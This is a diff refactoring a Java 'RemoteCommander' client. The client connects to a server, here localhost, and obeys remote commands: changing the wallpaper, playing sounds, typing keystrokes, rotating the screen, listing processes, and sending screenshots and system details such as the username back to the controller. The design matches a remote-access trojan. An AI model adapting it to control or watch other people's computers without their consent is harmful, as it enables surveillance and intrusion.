@@ -14,131 +14,58 @@ public class Client
 {
     private static final int SERVER_PORT = 0xbeef;
     private static final String SERVER_IP_ADDRESS = "127.0.0.1";
-    private static final int MAJOR_VERSION = 0;
-    private static final int MINOR_VERSION = 3;
     private Socket socket;
     private CommandSet commandSet;
-    private DataInputStream inFromServer;
-    private DataOutputStream outToServer;
 
     public Client() throws IOException, UnknownOperatingSystemException, AWTException
     {
-        commandSet = setCommandSet();
         connectAndListen();
     }
 
     /**
      * gets the appropriate command set for the OS that the client is running
+     * @param connection the socket that the client is using to connect to the server
      * @return the com.github.connorf.RemoteCommander.CommandSet that will work on the clients operating system
      * @throws UnknownOperatingSystemException if the operating system is unrecognised
      */
-    private CommandSet setCommandSet() throws UnknownOperatingSystemException
+    private CommandSet setCommandSet(Socket connection) throws UnknownOperatingSystemException
     {
         String operatingSystem = System.getProperty("os.name");
         if(operatingSystem.equals(OS_LINUX))
-            return new LinuxCommandSet();
+            return new LinuxCommandSet(connection);
         if(operatingSystem.startsWith(OS_WINDOWS))
-            return new WindowsCommandSet();
+            return new WindowsCommandSet(connection);
         if(operatingSystem.startsWith(OS_MAC))
-            return new MacCommandSet();
+            return new MacCommandSet(connection);
 
         throw new UnknownOperatingSystemException("Client OS not Linux, Mac or Windows");
     }
 
     /**
-     * connects to the command server and waits for commands
-     * @throws IOException if something went wrong connecting to the command server
+     * connects to the server (if its online) and waits for commands
+     * @throws IOException if something went wrong with the socket
+     * @throws AWTException something went wrong in the processServerCommand() method
+     * @throws UnknownOperatingSystemException if the client isn't running windows, linux or mac (although support for any os
+     * can be added quite easily)
      */
-    private void connectAndListen() throws IOException, AWTException
+    private void connectAndListen() throws IOException, AWTException, UnknownOperatingSystemException
     {
         socket = new Socket(SERVER_IP_ADDRESS, SERVER_PORT);
-        inFromServer = new DataInputStream(socket.getInputStream());
-        outToServer = new DataOutputStream(socket.getOutputStream());
+        commandSet = setCommandSet(socket);
 
         while(socket.isConnected())
         {
-            String serverCommand = getCommandFromServer();
+            String serverCommand = commandSet.getCommandFromServer();
             System.out.println("Command read from server: " + serverCommand);
             if(serverCommand.equals(CMD_TYPE) || serverCommand.equals(CMD_ROTATE)) // 1 arg commands
-                processServerCommand(serverCommand, getCommandFromServer());
+                processServerCommand(serverCommand, commandSet.getCommandFromServer());
             else if(serverCommand.equals(CMD_CHAOS) || serverCommand.equals(CMD_SOUND) || serverCommand.equals(CMD_WALLPAPER)) // 2 arg commands
-                processServerCommand(serverCommand, getCommandFromServer(), getCommandFromServer());
+                processServerCommand(serverCommand, commandSet.getCommandFromServer(), commandSet.getCommandFromServer());
             else if(serverCommand.equals(CMD_MSG)) // 4 arg commands
-                processServerCommand(serverCommand, getCommandFromServer(), getCommandFromServer(), getCommandFromServer());
+                processServerCommand(serverCommand, commandSet.getCommandFromServer(), commandSet.getCommandFromServer(), commandSet.getCommandFromServer());
             else
                 processServerCommand(serverCommand);
         }
-    }
-
-    /**
-     * gets the command string sent from the server
-     * @return the command the server sent, null if something went wrong reading the stream
-     */
-    private String getCommandFromServer()
-    {
-        String serverCommand = null;
-        try
-        {
-            int commandLength = inFromServer.readInt();
-            byte[] commandBytes = new byte[commandLength];
-            inFromServer.readFully(commandBytes, 0, commandLength);
-            serverCommand = new String(commandBytes);
-        }
-        catch(IOException ioe)
-        {
-            System.err.println("Something went wrong reading the command from the server");
-            ioe.printStackTrace();
-        }
-
-        return serverCommand;
-    }
-
-    /**
-     * retrieves a file sent from the server to us
-     * @param size the size of the file to retrieve in bytes
-     * @param prefix the prefix name the file should have
-     * @param suffix the suffix of the name of the file (must be a file extension to work with windows)
-     * @return the file retrieved from the server
-     * @throws IOException if something went wrong reading the file from the stream
-     */
-    private File getFileFromServer(int size, String prefix, String suffix) throws IOException
-    {
-        File fileFromServer = File.createTempFile(prefix, suffix, new File(commandSet.getTempPath()));
-        byte[] buffer = new byte[size];
-
-        FileOutputStream fos = new FileOutputStream(fileFromServer);
-        System.out.println("Before readFully: File: " + fileFromServer.getName() + " with size: " + size);
-        inFromServer.readFully(buffer, 0, size);
-        fos.write(buffer, 0, size);
-        fos.flush();
-        System.out.println("After readFully: Size: " + fileFromServer.length());
-        fos.close();
-
-        System.out.println("Done file transfer");
-        return fileFromServer;
-    }
-
-    /**
-     * for sending data on the clients machine back to the server. e.g. screenshots
-     * @param toSend the file that needs to be sent
-     * @throws IOException if something went wrong sending the file
-     */
-    public void sendFile(File toSend) throws IOException
-    {
-        byte[] buffer = new byte[(int)toSend.length()];
-        InputStream sendMe = new FileInputStream(toSend);
-
-        outToServer.writeInt((int) toSend.length());
-        int count;
-        int sentBytes = 0;
-        while(sentBytes != toSend.length() && (count = sendMe.read(buffer)) > 0)
-        {
-            sentBytes += count;
-            outToServer.write(buffer, 0, count);
-        }
-
-        outToServer.flush();
-        sendMe.close();
     }
 
     /**
@@ -158,7 +85,7 @@ public class Client
                 {
                     int fileSize = Integer.valueOf(serverCommand[1]);
                     String fileType = serverCommand[2];
-                    File image = getFileFromServer(fileSize, "wal", fileType);
+                    File image = commandSet.getFileFromServer(fileSize, "wal", fileType);
                     commandSet.setWallpaper(image);
                     image.deleteOnExit();
                 }
@@ -174,7 +101,7 @@ public class Client
                     int fileSize = Integer.valueOf(serverCommand[1]);
                     String fileType = serverCommand[2];
                     if(fileType.equals(TYPE_WAV)) // java sound supports wav files
-                        new Thread(new MakeSound(getFileFromServer(fileSize, "sou", ".wav"))).start();
+                        new Thread(new MakeSound(commandSet.getFileFromServer(fileSize, "sou", ".wav"))).start();
                 }
                 catch(Exception e)
                 {
@@ -201,72 +128,25 @@ public class Client
                 commandSet.type(serverCommand[1]);
                 break;
             case CMD_RETRIEVE:
-                sendAllImages();
+                commandSet.sendAllImages();
                 break;
             case CMD_SYSINFO:
-                sendOSInfo();
+                commandSet.sendOSInfo();
                 break;
             case CMD_ROTATE:
-                System.out.println("in rotate case");
                 if(serverCommand[1].equals(DIR_NORMAL) || serverCommand[1].equals(DIR_INVERTED) || serverCommand[1].equals(DIR_LEFT) || serverCommand[1].equals(DIR_RIGHT))
                     commandSet.rotate(serverCommand[1]);
                 break;
             case CMD_MINIMISE:
                 commandSet.minimise();
                 break;
+            case CMD_LIST_PROCESSES:
+                commandSet.listProcesses();
+                break;
             default:
                 System.out.println("Reached default in processServerCommand break. With serverCommands: ");
                 for(String s : serverCommand)
                     System.out.println(s);
-        }
-    }
-
-    /**
-     * sends this clients os info to the server, including the os name, jre arch, java version,
-     * language, country, username and desktop variant
-     * @throws IOException if something went wrong writing to the server
-     */
-    private void sendOSInfo() throws IOException
-    {
-        String os = "OS       : " + System.getProperty("os.name") + "\nJRE arch : " + System.getProperty("os.arch") + "\nJava     : " + System.getProperty("java.version") + "\nClient   : " + MAJOR_VERSION + "." + MINOR_VERSION + "\nUsername : " + System.getProperty("user.name") + "\nLanguage : " + System.getProperty("user.language") + "\nCountry  : " + System.getProperty("user.country") + "\nDesktop  : " + System.getProperty("sun.desktop");
-        outToServer.writeInt(os.length());
-        outToServer.write(os.getBytes(), 0, os.length());
-    }
-
-    private void sendAllImages() //todo: refactor
-    {
-        File[] allImages = new File(commandSet.getTempPath()).listFiles();
-
-        try
-        {
-            DataOutputStream outToServer = new DataOutputStream(socket.getOutputStream());
-            int numOfImages = 0;
-            for(File file : allImages)
-            {
-                if(file.getName().endsWith(".jpg"))
-                    numOfImages++;
-            }
-            outToServer.writeInt(numOfImages);
-        }
-        catch(IOException ioe)
-        {
-            System.err.println("Failed creating connection to server to send files");
-        }
-
-        for(File file : allImages)
-        {
-            if(file.getName().endsWith(".jpg"))
-            {
-                try
-                {
-                    sendFile(file);
-                    file.delete();
-                }
-                catch(IOException ioe)
-                {
-                    ioe.printStackTrace();
-                }
-            }
         }
     }
 }
